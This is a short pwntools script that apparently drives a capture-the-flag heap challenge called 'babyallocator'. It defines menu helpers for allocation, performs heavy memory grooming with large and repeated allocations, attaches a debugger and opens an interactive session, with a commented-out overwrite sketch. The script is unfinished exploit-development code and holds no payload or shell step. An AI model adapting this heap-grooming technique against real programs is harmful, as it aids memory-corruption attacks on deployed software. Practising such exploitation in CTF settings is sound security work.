from pwn import *

e = ELF("./babyallocator")
libc = ELF("./libc_64.so.6")

p = process(e.path, env={"LD_PRELOAD": libc.path})

def alloc_s(size, name="AAAA"):
  p.sendline("1")
  p.sendlineafter(":", str(size))
  p.sendlineafter("? :", name)
  p.recvuntil("choice:")

def alloc_h(size, name="AAAA"):
  p.sendline("2")
  p.sendlineafter(":", str(size))
  p.sendlineafter("? :", name)
  p.recvuntil("choice:")

def new_a():
  p.sendline("4")
  p.recvuntil("choice:")

p.recvuntil("choice:")


alloc_h(0x110000)
for i in range(10000):
  new_a()
for i in range(2):
  print(i)
  alloc_s(0x1000 - 1)
  new_a()


gdb.attach(p)
new_a()
alloc_h(0x111000 - 0x18)


#p.sendline("3")
#p.sendafter(":", p64(0x1337) * ((0x111000 - 0x18) / 8 ))


p.interactive()
